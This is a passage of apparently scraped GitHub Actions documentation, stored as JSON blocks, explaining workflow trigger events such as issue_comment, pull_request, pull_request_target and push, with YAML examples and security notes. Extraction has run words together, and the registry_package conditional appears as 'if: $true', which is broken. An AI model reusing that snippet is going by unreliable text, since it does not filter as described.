        "text": "More than one activity type triggers this event. For information about each activity type, seeWebhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using thetypeskeyword. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This event will only trigger a workflow run if the workflow file exists on the default branch."
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when an issue or pull request comment is created, edited, or deleted. For information about the issue comment APIs, seeObjectsin the GraphQL API documentation orWebhook events and payloadsin the REST API documentation."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when an issue or pull request comment has beencreatedordeleted."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  issue_comment:\n    types: [created, deleted]"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "issue_commenton issues only or pull requests only"
      },
      {
        "type": "paragraph",
        "text": "Theissue_commentevent occurs for comments on both issues and pull requests. You can use thegithub.event.issue.pull_requestproperty in a conditional to take different action depending on whether the triggering object was an issue or pull request."
      },
      {
        "type": "paragraph",
        "text": "For example, this workflow will run thepr_commentedjob only if theissue_commentevent originated from a pull request. It will run theissue_commentedjob only if theissue_commentevent originated from an issue."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on: issue_comment\n\njobs:\n  pr_commented:\n    # This job only runs for pull request comments\n    name: PR comment\n    if: ${{ github.event.issue.pull_request }}\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          echo A comment on PR $NUMBER\n        env:\n          NUMBER: ${{ github.event.issue.number }}\n\n  issue_commented:\n    # This job only runs for issue comments\n    name: Issue comment\n    if: ${{ !github.event.issue.pull_request }}\n    runs-on: ubuntu-latest\n    steps:\n      - run: |\n          echo A comment on issue $NUMBER\n        env:\n          NUMBER: ${{ github.event.issue.number }}"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "issues"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "More than one activity type triggers this event. For information about each activity type, seeWebhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using thetypeskeyword. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This event will only trigger a workflow run if the workflow file exists on the default branch."
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when an issue in the workflow's repository is created or modified. For activity related to comments in an issue, use theissue_commentevent. For more information about issues, seeAbout issues. For information about the issue APIs, seeObjectsin the GraphQL API documentation orREST API endpoints for issues."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when an issue has beenopened,edited, ormilestoned."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  issues:\n    types: [opened, edited, milestoned]"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "label"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "More than one activity type triggers this event. For information about each activity type, seeWebhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using thetypeskeyword. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This event will only trigger a workflow run if the workflow file exists on the default branch."
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when a label in your workflow's repository is created or modified. For more information about labels, seeManaging labels. For information about the label APIs, seeObjectsin the GraphQL API documentation orREST API endpoints for labels."
      },
      {
        "type": "paragraph",
        "text": "If you want to run your workflow when a label is added to or removed from an issue, pull request, or discussion, use thelabeledorunlabeledactivity types for theissues,pull_request,pull_request_target, ordiscussionevents instead."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when a label has beencreatedordeleted."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  label:\n    types: [created, deleted]"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "merge_group"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "More than one activity type triggers this event. Although only thechecks_requestedactivity type is supported, specifying the activity type will keep your workflow specific if more activity types are added in the future. For information about each activity type, seeWebhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using thetypeskeyword. For more information, seeWorkflow syntax for GitHub Actions.",
          "If your repository uses GitHub Actions to perform required checks on pull requests in your repository, you need to update the workflows to include themerge_groupevent as an additional trigger. Otherwise, status checks will not be triggered when you add a pull request to a merge queue. The merge will fail as the required status check will not be reported. Themerge_groupevent is separate from thepull_requestandpushevents."
        ]
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when a pull request is added to a merge queue, which adds the pull request to a merge group. For more information seeMerging a pull request with a merge queue."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when thechecks_requestedactivity has occurred."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request:\n    branches: [ \"main\" ]\n  merge_group:\n    types: [checks_requested]"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "milestone"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "More than one activity type triggers this event. For information about each activity type, seeWebhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using thetypeskeyword. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This event will only trigger a workflow run if the workflow file exists on the default branch."
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when a milestone in the workflow's repository is created or modified. For more information about milestones, seeAbout milestones. For information about the milestone APIs, seeObjectsin the GraphQL API documentation orREST API endpoints for milestones."
      },
      {
        "type": "paragraph",
        "text": "If you want to run your workflow when an issue is added to or removed from a milestone, use themilestonedordemilestonedactivity types for theissuesevent instead."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when a milestone has beenopenedordeleted."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  milestone:\n    types: [opened, deleted]"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "page_build"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This event will only trigger a workflow run if the workflow file exists on the default branch."
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when someone pushes to a branch that is the publishing source for GitHub Pages, if GitHub Pages is enabled for the repository. For more information about GitHub Pages publishing sources, seeConfiguring a publishing source for your GitHub Pages site. For information about the REST API, seeREST API endpoints for repositories."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when thepage_buildevent occurs."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  page_build"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "public"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This event will only trigger a workflow run if the workflow file exists on the default branch."
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when your workflow's repository changes from private to public. For information about the REST API, seeREST API endpoints for repositories."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when thepublicevent occurs."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  public"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "pull_request"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "More than one activity type triggers this event. For information about each activity type, seeWebhook events and payloads. By default, a workflow only runs when apull_requestevent's activity type isopened,synchronize, orreopened. To trigger workflows by different activity types, use thetypeskeyword. For more information, seeWorkflow syntax for GitHub Actions.",
          "Workflows will not run onpull_requestactivity if the pull request has a merge conflict. The merge conflict must be resolved first.\nConversely, workflows with thepull_request_targetevent will run even if the pull request has a merge conflict. Before using thepull_request_targettrigger, you should be aware of the security risks. For more information, seepull_request_target.",
          "Thepull_requestwebhook event payload is empty for merged pull requests and pull requests that come from forked repositories.",
          "The value ofGITHUB_REFvaries for a closed pull request depending on whether the pull request has been merged or not. If a pull request was closed but not merged, it will berefs/pull/PULL_REQUEST_NUMBER/merge. If a pull request was closed as a result of being merged, it will be the fully qualifiedrefof the branch it was merged into, for example/refs/heads/main."
        ]
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when activity on a pull request in the workflow's repository occurs. For example, if no activity types are specified, the workflow runs when a pull request is opened or reopened or when the head branch of the pull request is updated. For activity related to pull request reviews, pull request review comments, or pull request comments, use thepull_request_review,pull_request_review_comment, orissue_commentevents instead. For information about the pull request APIs, seeObjectsin the GraphQL API documentation orREST API endpoints for pull requests."
      },
      {
        "type": "paragraph",
        "text": "Note thatGITHUB_SHAfor this event is the last merge commit of the pull request merge branch. If you want to get the commit ID for the last commit to the head branch of the pull request, usegithub.event.pull_request.head.shainstead."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when a pull request has been opened or reopened."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request:\n    types: [opened, reopened]"
      },
      {
        "type": "paragraph",
        "text": "You can use the event context to further control when jobs in your workflow will run. For example, this workflow will run when a review is requested on a pull request, but thespecific_review_requestedjob will only run when a review byocto-teamis requested."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request:\n    types: [review_requested]\njobs:\n  specific_review_requested:\n    runs-on: ubuntu-latest\n    if: ${{ github.event.requested_team.name == 'octo-team'}}\n    steps:\n      - run: echo 'A review from octo-team was requested'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running yourpull_requestworkflow based on the head or base branch of a pull request"
      },
      {
        "type": "paragraph",
        "text": "You can use thebranchesorbranches-ignorefilter to configure your workflow to only run on pull requests that target specific branches. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "For example, this workflow will run when someone opens a pull request that targets a branch whose name starts withreleases/:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request:\n    types:\n      - opened\n    branches:\n      - 'releases/**'"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If you use both thebranchesfilter and thepathsfilter, the workflow will only run when both filters are satisfied. For example, the following workflow will only run when a pull request that includes a change to a JavaScript (.js) file is opened on a branch whose name starts withreleases/:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request:\n    types:\n      - opened\n    branches:\n      - 'releases/**'\n    paths:\n      - '**.js'"
      },
      {
        "type": "paragraph",
        "text": "To run a job based on the pull request's head branch name (as opposed to the pull request's base branch name), use thegithub.head_refcontext in a conditional. For example, this workflow will run whenever a pull request is opened, but therun_ifjob will only execute if the head of the pull request is a branch whose name starts withreleases/:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request:\n    types:\n      - opened\njobs:\n  run_if:\n    if: startsWith(github.head_ref, 'releases/')\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"The head of this PR starts with 'releases/'\""
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running yourpull_requestworkflow based on files changed in a pull request"
      },
      {
        "type": "paragraph",
        "text": "You can also configure your workflow to run when a pull request changes specific files. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "For example, this workflow will run when a pull request includes a change to a JavaScript file (.js):"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request:\n    paths:\n      - '**.js'"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If you use both thebranchesfilter and thepathsfilter, the workflow will only run when both filters are satisfied. For example, the following workflow will only run when a pull request that includes a change to a JavaScript (.js) file is opened on a branch whose name starts withreleases/:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request:\n    types:\n      - opened\n    branches:\n      - 'releases/**'\n    paths:\n      - '**.js'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running yourpull_requestworkflow when a pull request merges"
      },
      {
        "type": "paragraph",
        "text": "When a pull request merges, the pull request is automatically closed. To run a workflow when a pull request merges, use thepull_requestclosedevent type along with a conditional that checks themergedvalue of the event. For example, the following workflow will run whenever a pull request closes. Theif_mergedjob will only run if the pull request was also merged."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request:\n    types:\n      - closed\n\njobs:\n  if_merged:\n    if: github.event.pull_request.merged == true\n    runs-on: ubuntu-latest\n    steps:\n    - run: |\n        echo The PR was merged"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Workflows in forked repositories"
      },
      {
        "type": "paragraph",
        "text": "Workflows don't run in forked repositories by default. You must enable GitHub Actions in theActionstab of the forked repository."
      },
      {
        "type": "paragraph",
        "text": "With the exception ofGITHUB_TOKEN, secrets are not passed to the runner when a workflow is triggered from a forked repository. TheGITHUB_TOKENhas read-only permissions in pull requests from forked repositories. For more information, seeAutomatic token authentication."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Pull request events for forked repositories"
      },
      {
        "type": "paragraph",
        "text": "For pull requests from a forked repository to the base repository, GitHub sends thepull_request,issue_comment,pull_request_review_comment,pull_request_review, andpull_request_targetevents to the base repository. No pull request events occur on the forked repository."
      },
      {
        "type": "paragraph",
        "text": "When a first-time contributor submits a pull request to a public repository, a maintainer with write access may need to approve running workflows on the pull request. For more information, seeApproving workflow runs from public forks."
      },
      {
        "type": "paragraph",
        "text": "For pull requests from a forked repository to a private repository, workflows only run when they are enabled, seeManaging GitHub Actions settings for a repository."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Workflows triggered by Dependabot pull requests are treated as though they are from a forked repository, and are also subject to these restrictions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "pull_request_comment(useissue_comment)"
      },
      {
        "type": "paragraph",
        "text": "To run your workflow when a comment on a pull request (not on a pull request's diff) is created, edited, or deleted, use theissue_commentevent. For activity related to pull request reviews or pull request review comments, use thepull_request_revieworpull_request_review_commentevents."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "pull_request_review"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "More than one activity type triggers this event. For information about each activity type, seeWebhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using thetypeskeyword. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when a pull request review is submitted, edited, or dismissed. A pull request review is a group of pull request review comments in addition to a body comment and a state. For activity related to pull request review comments or pull request comments, use thepull_request_review_commentorissue_commentevents instead. For information about the pull request review APIs, seeObjectsin the GraphQL API documentation orREST API endpoints for pull requests."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when a pull request review has beeneditedordismissed."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request_review:\n    types: [edited, dismissed]"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running a workflow when a pull request is approved"
      },
      {
        "type": "paragraph",
        "text": "To run your workflow when a pull request has been approved, you can trigger your workflow with thesubmittedtype ofpull_request_reviewevent, then check the review state with thegithub.event.review.stateproperty. For example, this workflow will run whenever a pull request review is submitted, but theapprovedjob will only run if the submitted review is an approving review:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request_review:\n    types: [submitted]\n\njobs:\n  approved:\n    if: github.event.review.state == 'approved'\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"This PR was approved\""
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Workflows in forked repositories"
      },
      {
        "type": "paragraph",
        "text": "Workflows don't run in forked repositories by default. You must enable GitHub Actions in theActionstab of the forked repository."
      },
      {
        "type": "paragraph",
        "text": "With the exception ofGITHUB_TOKEN, secrets are not passed to the runner when a workflow is triggered from a forked repository. TheGITHUB_TOKENhas read-only permissions in pull requests from forked repositories. For more information, seeAutomatic token authentication."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Pull request events for forked repositories"
      },
      {
        "type": "paragraph",
        "text": "For pull requests from a forked repository to the base repository, GitHub sends thepull_request,issue_comment,pull_request_review_comment,pull_request_review, andpull_request_targetevents to the base repository. No pull request events occur on the forked repository."
      },
      {
        "type": "paragraph",
        "text": "When a first-time contributor submits a pull request to a public repository, a maintainer with write access may need to approve running workflows on the pull request. For more information, seeApproving workflow runs from public forks."
      },
      {
        "type": "paragraph",
        "text": "For pull requests from a forked repository to a private repository, workflows only run when they are enabled, seeManaging GitHub Actions settings for a repository."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Workflows triggered by Dependabot pull requests are treated as though they are from a forked repository, and are also subject to these restrictions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "pull_request_review_comment"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "More than one activity type triggers this event. For information about each activity type, seeWebhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using thetypeskeyword. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when a pull request review comment is modified. A pull request review comment is a comment on a pull request's diff. For activity related to pull request reviews or pull request comments, use thepull_request_revieworissue_commentevents instead. For information about the pull request review comment APIs, seeObjectsin the GraphQL API documentation orREST API endpoints for pull requests."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when a pull request review comment has beencreatedordeleted."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request_review_comment:\n    types: [created, deleted]"
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Workflows in forked repositories"
      },
      {
        "type": "paragraph",
        "text": "Workflows don't run in forked repositories by default. You must enable GitHub Actions in theActionstab of the forked repository."
      },
      {
        "type": "paragraph",
        "text": "With the exception ofGITHUB_TOKEN, secrets are not passed to the runner when a workflow is triggered from a forked repository. TheGITHUB_TOKENhas read-only permissions in pull requests from forked repositories. For more information, seeAutomatic token authentication."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Pull request events for forked repositories"
      },
      {
        "type": "paragraph",
        "text": "For pull requests from a forked repository to the base repository, GitHub sends thepull_request,issue_comment,pull_request_review_comment,pull_request_review, andpull_request_targetevents to the base repository. No pull request events occur on the forked repository."
      },
      {
        "type": "paragraph",
        "text": "When a first-time contributor submits a pull request to a public repository, a maintainer with write access may need to approve running workflows on the pull request. For more information, seeApproving workflow runs from public forks."
      },
      {
        "type": "paragraph",
        "text": "For pull requests from a forked repository to a private repository, workflows only run when they are enabled, seeManaging GitHub Actions settings for a repository."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Workflows triggered by Dependabot pull requests are treated as though they are from a forked repository, and are also subject to these restrictions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "pull_request_target"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "More than one activity type triggers this event. For information about each activity type, seeWebhook events and payloads. By default, a workflow only runs when apull_request_targetevent's activity type isopened,synchronize, orreopened. To trigger workflows by different activity types, use thetypeskeyword. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when activity on a pull request in the workflow's repository occurs. For example, if no activity types are specified, the workflow runs when a pull request is opened or reopened or when the head branch of the pull request is updated."
      },
      {
        "type": "paragraph",
        "text": "This event runs in the context of the base of the pull request, rather than in the context of the merge commit, as thepull_requestevent does. This prevents execution of unsafe code from the head of the pull request that could alter your repository or steal any secrets you use in your workflow. This event allows your workflow to do things like label or comment on pull requests from forks. Avoid using this event if you need to build or run code from the pull request."
      },
      {
        "type": "paragraph",
        "text": "To ensure repository security, branches with names that match certain patterns (such as those which look similar to SHAs) may not trigger workflows with thepull_request_targetevent."
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "For workflows that are triggered by thepull_request_targetevent, theGITHUB_TOKENis granted read/write repository permission unless thepermissionskey is specified and the workflow can access secrets, even when it is triggered from a fork. Although the workflow runs in the context of the base of the pull request, you should make sure that you do not check out, build, or run untrusted code from the pull request with this event. Additionally, any caches share the same scope as the base branch. To help prevent cache poisoning, you should not save the cache if there is a possibility that the cache contents were altered. For more information, seeKeeping your GitHub Actions and workflows secure: Preventing pwn requestson the GitHub Security Lab website."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when a pull request has beenassigned,opened,synchronize, orreopened."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request_target:\n    types: [assigned, opened, synchronize, reopened]"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running yourpull_request_targetworkflow based on the head or base branch of a pull request"
      },
      {
        "type": "paragraph",
        "text": "You can use thebranchesorbranches-ignorefilter to configure your workflow to only run on pull requests that target specific branches. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "For example, this workflow will run when someone opens a pull request that targets a branch whose name starts withreleases/:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request_target:\n    types:\n      - opened\n    branches:\n      - 'releases/**'"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If you use both thebranchesfilter and thepathsfilter, the workflow will only run when both filters are satisfied. For example, the following workflow will only run when a pull request that includes a change to a JavaScript (.js) file is opened on a branch whose name starts withreleases/:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request_target:\n    types:\n      - opened\n    branches:\n      - 'releases/**'\n    paths:\n      - '**.js'"
      },
      {
        "type": "paragraph",
        "text": "To run a job based on the pull request's head branch name (as opposed to the pull request's base branch name), use thegithub.head_refcontext in a conditional. For example, this workflow will run whenever a pull request is opened, but therun_ifjob will only execute if the head of the pull request is a branch whose name starts withreleases/:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request_target:\n    types:\n      - opened\njobs:\n  run_if:\n    if: startsWith(github.head_ref, 'releases/')\n    runs-on: ubuntu-latest\n    steps:\n      - run: echo \"The head of this PR starts with 'releases/'\""
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running yourpull_request_targetworkflow based on files changed in a pull request"
      },
      {
        "type": "paragraph",
        "text": "You can use thepathsorpaths-ignorefilter to configure your workflow to run when a pull request changes specific files. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "For example, this workflow will run when a pull request includes a change to a JavaScript file (.js):"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request_target:\n    paths:\n      - '**.js'"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If you use both thebranchesfilter and thepathsfilter, the workflow will only run when both filters are satisfied. For example, the following workflow will only run when a pull request that includes a change to a JavaScript (.js) file is opened on a branch whose name starts withreleases/:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request_target:\n    types:\n      - opened\n    branches:\n      - 'releases/**'\n    paths:\n      - '**.js'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running yourpull_request_targetworkflow when a pull request merges"
      },
      {
        "type": "paragraph",
        "text": "When a pull request merges, the pull request is automatically closed. To run a workflow when a pull request merges, use thepull_request_targetclosedevent type along with a conditional that checks themergedvalue of the event. For example, the following workflow will run whenever a pull request closes. Theif_mergedjob will only run if the pull request was also merged."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  pull_request_target:\n    types:\n      - closed\n\njobs:\n  if_merged:\n    if: github.event.pull_request.merged == true\n    runs-on: ubuntu-latest\n    steps:\n    - run: |\n        echo The PR was merged"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "push"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The webhook payload available to GitHub Actions does not include theadded,removed, andmodifiedattributes in thecommitobject. You can retrieve the full commit object using the API. For information, seeObjectsin the GraphQL API documentation orREST API endpoints for commits."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Events will not be created if more than 5,000 branches are pushed at once. Events will not be created for tags when more than three tags are pushed at once."
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when you push a commit or tag, or when you create a repository from a template."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when thepushevent occurs."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "When apushwebhook event triggers a workflow run, the Actions UI's \"pushed by\" field shows the account of the pusher and not the author or committer. However, if the changes are pushed to a repository using SSH authentication with a deploy key, then the \"pushed by\" field will be the repository admin who verified the deploy key when it was added it to a repository."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running your workflow only when a push to specific branches occurs"
      },
      {
        "type": "paragraph",
        "text": "You can use thebranchesorbranches-ignorefilter to configure your workflow to only run when specific branches are pushed. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "For example, this workflow will run when someone pushes tomainor to a branch that starts withreleases/."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    branches:\n      - 'main'\n      - 'releases/**'"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If you use both thebranchesfilter and thepathsfilter, the workflow will only run when both filters are satisfied. For example, the following workflow will only run when a push that includes a change to a JavaScript (.js) file is made to a branch whose name starts withreleases/:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    branches:\n      - 'releases/**'\n    paths:\n      - '**.js'"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running your workflow only when a push of specific tags occurs"
      },
      {
        "type": "paragraph",
        "text": "You can use thetagsortags-ignorefilter to configure your workflow to only run when specific tags are pushed. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "For example, this workflow will run when someone pushes a tag that starts withv1.."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    tags:\n      - v1.**"
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Running your workflow only when a push affects specific files"
      },
      {
        "type": "paragraph",
        "text": "You can use thepathsorpaths-ignorefilter to configure your workflow to run when a push to specific files occurs. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "For example, this workflow will run when someone pushes a change to a JavaScript file (.js):"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    paths:\n      - '**.js'"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If you use both thebranchesfilter and thepathsfilter, the workflow will only run when both filters are satisfied. For example, the following workflow will only run when a push that includes a change to a JavaScript (.js) file is made to a branch whose name starts withreleases/:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  push:\n    branches:\n      - 'releases/**'\n    paths:\n      - '**.js'"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "registry_package"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "More than one activity type triggers this event. For information about each activity type, seeWebhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using thetypeskeyword. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This event will only trigger a workflow run if the workflow file exists on the default branch."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "When pushing multi-architecture container images, this event occurs once per manifest, so you might observe your workflow triggering multiple times. To mitigate this, and only run your workflow job for the event that contains the actual image tag information, use a conditional:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "jobs:\n    job_name:\n        if: $true"
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when activity related to GitHub Packages occurs in your repository. For more information, seeGitHub Packages Documentation."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when a new package version has beenpublished."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  registry_package:\n    types: [published]"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "release"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "More than one activity type triggers this event. For information about each activity type, seeWebhook events and payloads. By default, all activity types trigger workflows that run on this event. You can limit your workflow runs to specific activity types using thetypeskeyword. For more information, seeWorkflow syntax for GitHub Actions."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Workflows are not triggered for thecreated,edited, ordeletedactivity types for draft releases. When you create your release through the GitHub UI, your release may automatically be saved as a draft."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Theprereleasedtype will not trigger for pre-releases published from draft releases, but thepublishedtype will trigger. If you want a workflow to run when stableandpre-releases publish, subscribe topublishedinstead ofreleasedandprereleased."
      },
      {
        "type": "paragraph",
        "text": "Runs your workflow when release activity in your repository occurs. For information about the release APIs, seeObjectsin the GraphQL API documentation orREST API endpoints for releases and release assetsin the REST API documentation."
      },
      {
        "type": "paragraph",
        "text": "For example, you can run a workflow when a release has beenpublished."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "on:\n  release:\n    types: [published]"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "repository_dispatch"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This event will only trigger a workflow run if the workflow file exists on the default branch."
      },
      {
        "type": "paragraph",
